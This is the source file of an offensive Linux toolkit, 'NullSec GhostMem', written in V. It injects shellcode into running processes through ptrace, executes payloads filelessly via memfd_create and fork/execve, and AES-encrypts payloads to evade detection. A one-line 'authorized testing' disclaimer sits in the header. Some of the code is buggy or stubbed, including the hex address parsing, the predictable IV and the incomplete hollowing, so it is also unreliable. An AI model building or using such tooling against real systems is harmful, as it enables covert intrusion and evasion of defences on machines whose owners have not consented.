// NullSec GhostMem - Fileless Memory Execution
// Language: V
// Author: bad-antics
// License: NullSec Proprietary
//
// Fileless payload execution and process injection techniques.
// For authorized security testing only.

module main

import os
import encoding.hex
import encoding.base64
import crypto.aes
import crypto.sha256
import flag

const version = '1.0.0'

const banner = '
    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   █░░░░░░░░░░░░░ G H O S T M E M ░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
                      bad-antics v${version}
'

// Memory protection flags (Linux)
const prot_read = 0x1
const prot_write = 0x2
const prot_exec = 0x4

const map_private = 0x2
const map_anonymous = 0x20

// Syscall numbers (x86_64 Linux)
const sys_mmap = 9
const sys_mprotect = 10
const sys_munmap = 11
const sys_memfd_create = 319
const sys_fork = 57
const sys_execve = 59
const sys_ptrace = 101
const sys_process_vm_writev = 311

// PTRACE requests
const ptrace_attach = 16
const ptrace_detach = 17
const ptrace_getregs = 12
const ptrace_setregs = 13
const ptrace_poketext = 4
const ptrace_cont = 7

// Process information
struct ProcessInfo {
	pid    int
	name   string
	cmdline string
	maps   []MemoryMap
}

struct MemoryMap {
	start     u64
	end       u64
	perms     string
	offset    u64
	dev       string
	inode     u64
	pathname  string
}

// Configuration
struct Config {
mut:
	mode     string
	payload  string
	target   int
	key      string
	output   string
	verbose  bool
}

fn main() {
	println(banner)
	
	mut cfg := Config{}
	
	mut fp := flag.new_flag_parser(os.args)
	fp.application('ghostmem')
	fp.version(version)
	fp.description('Fileless memory execution toolkit')
	fp.skip_executable()
	
	cfg.mode = fp.string('mode', `m`, '', 'Mode: inject/hollow/memexec/generate')
	cfg.payload = fp.string('payload', `p`, '', 'Payload file (shellcode/binary)')
	cfg.target = fp.int('target', `t`, 0, 'Target PID for injection')
	cfg.key = fp.string('key', `k`, '', 'Encryption key for payload')
	cfg.output = fp.string('output', `o`, '', 'Output file for generated payload')
	cfg.verbose = fp.bool('verbose', `v`, false, 'Verbose output')
	
	fp.finalize() or {
		eprintln(err)
		println(fp.usage())
		exit(1)
	}
	
	if cfg.mode == '' {
		print_usage()
		exit(1)
	}
	
	match cfg.mode {
		'inject' { cmd_inject(cfg) }
		'hollow' { cmd_hollow(cfg) }
		'memexec' { cmd_memexec(cfg) }
		'generate' { cmd_generate(cfg) }
		'list' { cmd_list_processes(cfg) }
		else {
			eprintln('[!] Unknown mode: ${cfg.mode}')
			print_usage()
			exit(1)
		}
	}
}

fn print_usage() {
	println('
USAGE:
    ghostmem -m <mode> [options]

MODES:
    inject      Inject shellcode into target process
    hollow      Process hollowing (replace process image)
    memexec     Execute payload from memory (fileless)
    generate    Generate encrypted/encoded payload
    list        List running processes

OPTIONS:
    -m, --mode      Operation mode
    -p, --payload   Payload file path
    -t, --target    Target process PID
    -k, --key       Encryption key
    -o, --output    Output file
    -v, --verbose   Verbose output

EXAMPLES:
    ghostmem -m list
    ghostmem -m inject -p shellcode.bin -t 1234 -v
    ghostmem -m memexec -p payload.bin -k secret
    ghostmem -m generate -p shellcode.bin -o encrypted.bin -k mykey
')
}

// List processes
fn cmd_list_processes(cfg Config) {
	println('[*] Listing processes...\n')
	
	procs := get_process_list()
	
	println('${"-".repeat(70)}')
	println('${"PID":-8} ${"NAME":-20} ${"CMDLINE":-40}')
	println('${"-".repeat(70)}')
	
	for proc in procs {
		cmdline := if proc.cmdline.len > 38 { proc.cmdline[..38] } else { proc.cmdline }
		println('${proc.pid:-8} ${proc.name:-20} ${cmdline:-40}')
	}
	
	println('${"-".repeat(70)}')
	println('[+] Total: ${procs.len} processes')
}

fn get_process_list() []ProcessInfo {
	mut procs := []ProcessInfo{}
	
	entries := os.ls('/proc') or { return procs }
	
	for entry in entries {
		pid := entry.int()
		if pid > 0 {
			proc := get_process_info(pid) or { continue }
			procs << proc
		}
	}
	
	return procs
}

fn get_process_info(pid int) ?ProcessInfo {
	comm_path := '/proc/${pid}/comm'
	cmdline_path := '/proc/${pid}/cmdline'
	
	name := os.read_file(comm_path) or { return none }
	cmdline := os.read_file(cmdline_path) or { '' }
	
	return ProcessInfo{
		pid: pid
		name: name.trim_space()
		cmdline: cmdline.replace('\x00', ' ').trim_space()
	}
}

// Shellcode injection
fn cmd_inject(cfg Config) {
	if cfg.payload == '' || cfg.target == 0 {
		eprintln('[!] Payload (-p) and target PID (-t) required')
		exit(1)
	}
	
	println('[*] Shellcode injection mode')
	println('[*] Target PID: ${cfg.target}')
	println('[*] Payload: ${cfg.payload}')
	
	// Read payload
	mut shellcode := os.read_bytes(cfg.payload) or {
		eprintln('[!] Failed to read payload: ${err}')
		exit(1)
	}
	
	// Decrypt if key provided
	if cfg.key != '' {
		if cfg.verbose { println('[*] Decrypting payload...') }
		shellcode = decrypt_payload(shellcode, cfg.key) or {
			eprintln('[!] Decryption failed: ${err}')
			exit(1)
		}
	}
	
	println('[*] Shellcode size: ${shellcode.len} bytes')
	
	// Verify target exists
	if !os.exists('/proc/${cfg.target}') {
		eprintln('[!] Target process does not exist')
		exit(1)
	}
	
	// Perform injection
	inject_shellcode(cfg.target, shellcode, cfg.verbose) or {
		eprintln('[!] Injection failed: ${err}')
		exit(1)
	}
	
	println('[+] Injection successful!')
}

fn inject_shellcode(pid int, shellcode []u8, verbose bool) ! {
	if verbose { println('[*] Attaching to process ${pid}...') }
	
	// ptrace attach
	res := unsafe { C.ptrace(ptrace_attach, pid, voidptr(0), voidptr(0)) }
	if res < 0 {
		return error('Failed to attach to process')
	}
	
	// Wait for process to stop
	os.system('wait ${pid} 2>/dev/null')
	
	if verbose { println('[*] Finding executable memory region...') }
	
	// Find executable region
	maps := parse_proc_maps(pid) or {
		unsafe { C.ptrace(ptrace_detach, pid, voidptr(0), voidptr(0)) }
		return error('Failed to read memory maps')
	}
	
	mut target_addr := u64(0)
	for m in maps {
		if m.perms.contains('x') && m.perms.contains('w') {
			target_addr = m.start
			if verbose { println('[*] Found RWX region at 0x${target_addr:x}') }
			break
		}
	}
	
	if target_addr == 0 {
		// No RWX, try to find code cave in executable region
		for m in maps {
			if m.perms.contains('x') {
				target_addr = m.start
				if verbose { println('[*] Found executable region at 0x${target_addr:x}') }
				break
			}
		}
	}
	
	if target_addr == 0 {
		unsafe { C.ptrace(ptrace_detach, pid, voidptr(0), voidptr(0)) }
		return error('No suitable memory region found')
	}
	
	if verbose { println('[*] Writing shellcode to 0x${target_addr:x}...') }
	
	// Write shellcode using ptrace POKETEXT
	mut offset := u64(0)
	for offset < u64(shellcode.len) {
		mut word := u64(0)
		for i := 0; i < 8 && offset + u64(i) < u64(shellcode.len); i++ {
			word |= u64(shellcode[offset + u64(i)]) << (i * 8)
		}
		
		unsafe {
			C.ptrace(ptrace_poketext, pid, voidptr(target_addr + offset), voidptr(word))
		}
		offset += 8
	}
	
	if verbose { println('[*] Shellcode written, executing...') }
	
	// Continue execution (simplified - real impl would modify RIP)
	unsafe { C.ptrace(ptrace_cont, pid, voidptr(0), voidptr(0)) }
	
	// Detach
	unsafe { C.ptrace(ptrace_detach, pid, voidptr(0), voidptr(0)) }
}

fn parse_proc_maps(pid int) ?[]MemoryMap {
	content := os.read_file('/proc/${pid}/maps') or { return none }
	
	mut maps := []MemoryMap{}
	
	for line in content.split('\n') {
		if line.len == 0 { continue }
		
		parts := line.split_any(' \t')
		if parts.len < 5 { continue }
		
		addr_parts := parts[0].split('-')
		if addr_parts.len != 2 { continue }
		
		maps << MemoryMap{
			start: addr_parts[0].u64() or { 0 }
			end: addr_parts[1].u64() or { 0 }
			perms: parts[1]
			pathname: if parts.len > 5 { parts[5] } else { '' }
		}
	}
	
	return maps
}

// Process hollowing
fn cmd_hollow(cfg Config) {
	println('[*] Process hollowing mode')
	println('[!] Note: Full process hollowing requires PE/ELF parsing')
	println('[!] This is a simplified demonstration')
	
	if cfg.payload == '' {
		eprintln('[!] Payload (-p) required')
		exit(1)
	}
	
	// Read payload
	payload := os.read_bytes(cfg.payload) or {
		eprintln('[!] Failed to read payload: ${err}')
		exit(1)
	}
	
	println('[*] Payload size: ${payload.len} bytes')
	println('[*] To perform full hollowing, use specialized tools')
}

// Memory execution (memfd_create)
fn cmd_memexec(cfg Config) {
	if cfg.payload == '' {
		eprintln('[!] Payload (-p) required')
		exit(1)
	}
	
	println('[*] Fileless memory execution mode')
	println('[*] Payload: ${cfg.payload}')
	
	// Read payload
	mut payload := os.read_bytes(cfg.payload) or {
		eprintln('[!] Failed to read payload: ${err}')
		exit(1)
	}
	
	// Decrypt if key provided
	if cfg.key != '' {
		if cfg.verbose { println('[*] Decrypting payload...') }
		payload = decrypt_payload(payload, cfg.key) or {
			eprintln('[!] Decryption failed: ${err}')
			exit(1)
		}
	}
	
	println('[*] Creating memory-backed file descriptor...')
	
	// Create memfd
	fd := memfd_create('nullsec', 0) or {
		eprintln('[!] memfd_create failed: ${err}')
		exit(1)
	}
	
	if cfg.verbose { println('[*] memfd created: fd=${fd}') }
	
	// Write payload to memfd
	os.fd_write(fd, payload.bytestr()) or {
		eprintln('[!] Failed to write to memfd')
		exit(1)
	}
	
	println('[*] Payload loaded to memory (${payload.len} bytes)')
	println('[*] Execute with: /proc/self/fd/${fd}')
	
	// Fork and exec
	println('[*] Forking process...')
	
	pid := unsafe { C.fork() }
	if pid == 0 {
		// Child - exec from memfd
		fd_path := '/proc/self/fd/${fd}'
		os.execve(fd_path, [], os.environ()) or {
			eprintln('[!] execve failed')
			exit(1)
		}
	} else if pid > 0 {
		println('[+] Child process PID: ${pid}')
		println('[+] Fileless execution initiated')
	} else {
		eprintln('[!] Fork failed')
	}
}

fn memfd_create(name string, flags u32) ?int {
	fd := unsafe { C.syscall(sys_memfd_create, name.str, flags) }
	if fd < 0 {
		return error('memfd_create syscall failed')
	}
	return int(fd)
}

// Generate encrypted payload
fn cmd_generate(cfg Config) {
	if cfg.payload == '' || cfg.output == '' || cfg.key == '' {
		eprintln('[!] Payload (-p), output (-o), and key (-k) required')
		exit(1)
	}
	
	println('[*] Payload generation mode')
	println('[*] Input: ${cfg.payload}')
	println('[*] Output: ${cfg.output}')
	
	// Read payload
	payload := os.read_bytes(cfg.payload) or {
		eprintln('[!] Failed to read payload: ${err}')
		exit(1)
	}
	
	println('[*] Original size: ${payload.len} bytes')
	
	// Encrypt
	println('[*] Encrypting with AES-256...')
	encrypted := encrypt_payload(payload, cfg.key) or {
		eprintln('[!] Encryption failed: ${err}')
		exit(1)
	}
	
	// Write output
	os.write_file(cfg.output, encrypted.bytestr()) or {
		eprintln('[!] Failed to write output: ${err}')
		exit(1)
	}
	
	println('[*] Encrypted size: ${encrypted.len} bytes')
	println('[+] Saved to: ${cfg.output}')
	
	// Print decryption stub
	println('\n[*] Decryption stub (V):')
	println('    payload := decrypt_payload(encrypted, "${cfg.key}")')
}

fn encrypt_payload(data []u8, key string) ?[]u8 {
	// Derive 32-byte key using SHA256
	key_bytes := sha256.sum(key.bytes())
	
	// Generate random IV
	mut iv := []u8{len: 16}
	for i in 0 .. 16 {
		iv[i] = u8(os.getpid() * i % 256)  // Simplified - use crypto random in prod
	}
	
	// Encrypt
	cipher := aes.new_cipher(key_bytes[..]) or { return error('Failed to create cipher') }
	
	// Pad data to block size
	padded := pkcs7_pad(data, 16)
	
	mut encrypted := []u8{len: padded.len}
	
	// CBC mode encryption (simplified)
	mut prev := iv.clone()
	for i := 0; i < padded.len; i += 16 {
		mut block := padded[i..i + 16].clone()
		
		// XOR with previous
		for j in 0 .. 16 {
			block[j] ^= prev[j]
		}
		
		// Encrypt block
		mut out := []u8{len: 16}
		cipher.encrypt(mut out, block)
		
		for j in 0 .. 16 {
			encrypted[i + j] = out[j]
		}
		
		prev = out.clone()
	}
	
	// Prepend IV
	mut result := []u8{}
	result << iv
	result << encrypted
	
	return result
}

fn decrypt_payload(data []u8, key string) ?[]u8 {
	if data.len < 32 {
		return error('Data too short')
	}
	
	// Derive key
	key_bytes := sha256.sum(key.bytes())
	
	// Extract IV
	iv := data[..16]
	encrypted := data[16..]
	
	// Decrypt
	cipher := aes.new_cipher(key_bytes[..]) or { return error('Failed to create cipher') }
	
	mut decrypted := []u8{len: encrypted.len}
	
	// CBC mode decryption
	mut prev := iv.clone()
	for i := 0; i < encrypted.len; i += 16 {
		block := encrypted[i..i + 16]
		
		mut out := []u8{len: 16}
		cipher.decrypt(mut out, block)
		
		// XOR with previous
		for j in 0 .. 16 {
			decrypted[i + j] = out[j] ^ prev[j]
		}
		
		prev = block.clone()
	}
	
	// Remove padding
	return pkcs7_unpad(decrypted)
}

fn pkcs7_pad(data []u8, block_size int) []u8 {
	pad_len := block_size - (data.len % block_size)
	mut padded := data.clone()
	for _ in 0 .. pad_len {
		padded << u8(pad_len)
	}
	return padded
}

fn pkcs7_unpad(data []u8) ?[]u8 {
	if data.len == 0 {
		return error('Empty data')
	}
	
	pad_len := int(data[data.len - 1])
	if pad_len > data.len || pad_len > 16 {
		return error('Invalid padding')
	}
	
	return data[..data.len - pad_len]
}

// C interop
fn C.ptrace(request int, pid int, addr voidptr, data voidptr) i64
fn C.fork() int
fn C.syscall(number i64, args ...voidptr) i64
